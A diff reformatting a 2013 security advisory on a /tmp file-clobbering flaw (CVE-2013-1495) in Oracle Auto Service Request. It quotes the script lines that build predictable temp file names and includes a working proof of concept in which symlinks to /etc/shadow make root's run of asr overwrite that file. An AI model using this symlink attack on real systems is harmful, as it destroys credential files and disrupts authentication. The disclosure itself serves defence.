@@ -1,82 +1,92 @@
-                                Advisory #: 18
-Title: Oracle Auto Service Request /tmp file clobbering vulnerability
-Author:Larry W. Cashdollar, @_larry0
-Date: 2013-02-19
-Download Site: http://docs.oracle.com/cd/E18476_01/doc.220/e18478/asr.htm
-Vendor:Oracle Systems
-Vendor Notified: 2013-02-19
-Vendor Contact: bugtraq email
-Description: Auto Service Request (ASR) is a secure, scalable, customer-
-installable software feature of warranty and Oracle Support Services that
-provides auto-case generation when common hardware component faults occur. ASR
-is designed to enable faster problem resolution by eliminating the need to
-initiate contact with Oracle Support Services for common hardware component
-failures, reducing both the number of phone calls needed and overall phone time
-required. ASR also simplifies support operations by using electronic diagnostic
-data. Easily installed and deployed, ASR is completely controlled by you, the
-customer, to ensure security. ASR is applicable only for component faults. Not
-all component failures are covered, though the most common components (such as
-disk, fan, and power supplies) are covered.
-Vulnerability:
-I noticed it creates files insecurely in /tmp using time stamps instead of
-mkstemp(). You can clobber root owned files if you know when around the time
-the root administrator will be using this utility. Problem code: The asr binary
-is a wrapper for a java class, the following snippet of code is where the error
-lies: /sbin/sh:root@unix-solaris# grep -n tmp asr 409: file1=/tmp/status1_`date
-'+%m%d%y%H%M%S'` 410: file2=/tmp/status2_`date '+%m%d%y%H%M%S'` 411: file3=/
-tmp/status3_`date '+%m%d%y%H%M%S'` 557: file1=/tmp/status1_`date
-'+%m%d%y%H%M%S'` 681: file1=/tmp/status1_`date '+%m%d%y%H%M%S'` 691: file1=/
-tmp/status1_`date '+%m%d%y%H%M%S'` 706: file1=/tmp/parse_jetty_`date
-'+%m%d%y%H%M%S'` 710: file2=/tmp/parse_jetty_port_`date '+%m%d%y%H%M%S'` 797:
-file1=/tmp/status1_`date '+%m%d%y%H%M%S'` 987: hostnameTempFile=/tmp/
-status1_`date '+%m%d%y%H%M%S'` 988: tempFile=/tmp/status2_`date
-'+%m%d%y%H%M%S'` 989: tempHostname=/tmp/status3_`date '+%m%d%y%H%M%S'` 1303:
-file1=/tmp/status1_`date '+%m%d%y%H%M%S'` 1334: file1=/tmp/status1_`date
-'+%m%d%y%H%M%S'` 1343: file1=/tmp/status1_`date '+%m%d%y%H%M%S'` 1344: file2=/
-tmp/status2_`date '+%m%d%y%H%M%S'` 1345: file3=/tmp/status3_`date
-'+%m%d%y%H%M%S'` 1405: tempFile=/tmp/localsnmp_`date '+%m%d%y%H%M%S'` 2198:
-tempFile=/tmp/localsnmp_`date '+%m%d%y%H%M%S'` This affects the software
-package on both Solaris and Linux.
-CVE-2013-1495
-JSON:Export
-Exploit Code:
-   1. [larry@oracle-os-lab01 tmp]$ for x in `seq 500 999`; do ln -s /etc/shadow
-      /tmp/status1_020213003$x; done
-   2.  
-   3. root executes the asr command:
-   4.  
-   5. [root@oracle-os-lab01 bin]# ./asr
-   6.  
-   7.         register OR register [-e asr-manager-relay-url]: register ASR
-   8.         unregister : unregister ASR
-   9.         show_reg_status : show ASR registration status
-  10.         test_connection : test connection to Oracle
-  11. .
-  12. .
-  13. .
-  14.  
-  15.         version : show asr script version
-  16.         exit
-  17.         help : display a list of commands
-  18.         ? : display a list of commands
-  19. asr>
-  20.  
-  21. /etc/shadow is now overwritten with the contents of /tmp/
-      status1_020213003722 root # cat /etc/shadow
-  22.  
-  23. id      State       Bundle
-  24. 68      ACTIVE      com.sun.svc.asr.sw_4.3.1
-  25.                     Fragments=69, 70
-  26. 69      RESOLVED    com.sun.svc.asr.sw-frag_4.3.1
-  27.                     Master=68
-  28. 70      RESOLVED    com.sun.svc.asr.sw-rulesdefinitions_4.3.1
-  29.                     Master=68
-  30. 72      ACTIVE      com.sun.svc.asr.sw.http.AsrHttpReceiver_1.0.0
-  31.                     Fragments=73
-  32. 73      RESOLVED    com.sun.svc.asr.sw.http-frag_1.0.0
-  33.                     Master=72
-  34.  
-  35. 67      ACTIVE      com.sun.svc.ServiceActivation_4.3.1
-  36.  
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/asr-clobber.html
+
+                               Advisory #: 18
+
+   Title: Oracle Auto Service Request /tmp file clobbering vulnerability
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2013-02-19
+   Download Site:
+   http://docs.oracle.com/cd/E18476_01/doc.220/e18478/asr.htm
+   Vendor: Oracle Systems
+   Vendor Notified: 2013-02-19
+   Vendor Contact: bugtraq email
+   Description: Auto Service Request (ASR) is a secure, scalable,
+   customer-installable software feature of warranty and Oracle Support
+   Services that provides auto-case generation when common hardware
+   component faults occur. ASR is designed to enable faster problem
+   resolution by eliminating the need to initiate contact with Oracle
+   Support Services for common hardware component failures, reducing both
+   the number of phone calls needed and overall phone time required. ASR
+   also simplifies support operations by using electronic diagnostic data.
+   Easily installed and deployed, ASR is completely controlled by you, the
+   customer, to ensure security. ASR is applicable only for component
+   faults. Not all component failures are covered, though the most common
+   components (such as disk, fan, and power supplies) are covered.
+   Vulnerability:
+   I noticed it creates files insecurely in /tmp using time stamps instead
+   of mkstemp(). You can clobber root owned files if you know when around
+   the time the root administrator will be using this utility. Problem
+   code: The asr binary is a wrapper for a java class, the following
+   snippet of code is where the error lies: /sbin/sh:root@unix-solaris#
+   grep -n tmp asr 409: file1=/tmp/status1_`date '+%m%d%y%H%M%S'` 410:
+   file2=/tmp/status2_`date '+%m%d%y%H%M%S'` 411: file3=/tmp/status3_`date
+   '+%m%d%y%H%M%S'` 557: file1=/tmp/status1_`date '+%m%d%y%H%M%S'` 681:
+   file1=/tmp/status1_`date '+%m%d%y%H%M%S'` 691: file1=/tmp/status1_`date
+   '+%m%d%y%H%M%S'` 706: file1=/tmp/parse_jetty_`date '+%m%d%y%H%M%S'`
+   710: file2=/tmp/parse_jetty_port_`date '+%m%d%y%H%M%S'` 797:
+   file1=/tmp/status1_`date '+%m%d%y%H%M%S'` 987:
+   hostnameTempFile=/tmp/status1_`date '+%m%d%y%H%M%S'` 988:
+   tempFile=/tmp/status2_`date '+%m%d%y%H%M%S'` 989:
+   tempHostname=/tmp/status3_`date '+%m%d%y%H%M%S'` 1303:
+   file1=/tmp/status1_`date '+%m%d%y%H%M%S'` 1334:
+   file1=/tmp/status1_`date '+%m%d%y%H%M%S'` 1343:
+   file1=/tmp/status1_`date '+%m%d%y%H%M%S'` 1344:
+   file2=/tmp/status2_`date '+%m%d%y%H%M%S'` 1345:
+   file3=/tmp/status3_`date '+%m%d%y%H%M%S'` 1405:
+   tempFile=/tmp/localsnmp_`date '+%m%d%y%H%M%S'` 2198:
+   tempFile=/tmp/localsnmp_`date '+%m%d%y%H%M%S'` This affects the
+   software package on both Solaris and Linux.
+   CVE-2013-1495
+   JSON: Export
+   Exploit Code:
+
+    1. [larry@oracle-os-lab01 tmp]$ for x in `seq 500 999`; do ln -s
+       /etc/shadow /tmp/status1_020213003$x; done
+    2.
+    3. root executes the asr command:
+    4.
+    5. [root@oracle-os-lab01 bin]# ./asr
+    6.
+    7. register OR register [-e asr-manager-relay-url]: register ASR
+    8. unregister : unregister ASR
+    9. show_reg_status : show ASR registration status
+   10. test_connection : test connection to Oracle
+   11. .
+   12. .
+   13. .
+   14.
+   15. version : show asr script version
+   16. exit
+   17. help : display a list of commands
+   18. ? : display a list of commands
+   19. asr>
+   20.
+   21. /etc/shadow is now overwritten with the contents of
+       /tmp/status1_020213003722 root # cat /etc/shadow
+   22.
+   23. id State Bundle
+   24. 68 ACTIVE com.sun.svc.asr.sw_4.3.1
+   25. Fragments=69, 70
+   26. 69 RESOLVED com.sun.svc.asr.sw-frag_4.3.1
+   27. Master=68
+   28. 70 RESOLVED com.sun.svc.asr.sw-rulesdefinitions_4.3.1
+   29. Master=68
+   30. 72 ACTIVE com.sun.svc.asr.sw.http.AsrHttpReceiver_1.0.0
+   31. Fragments=73
+   32. 73 RESOLVED com.sun.svc.asr.sw.http-frag_1.0.0
+   33. Master=72
+   34.
+   35. 67 ACTIVE com.sun.svc.ServiceActivation_4.3.1
+   36.
+
+   Screen Shots:
+   Advisory: http://www.vapid.dhs.org/advisories/asr-clobber.html
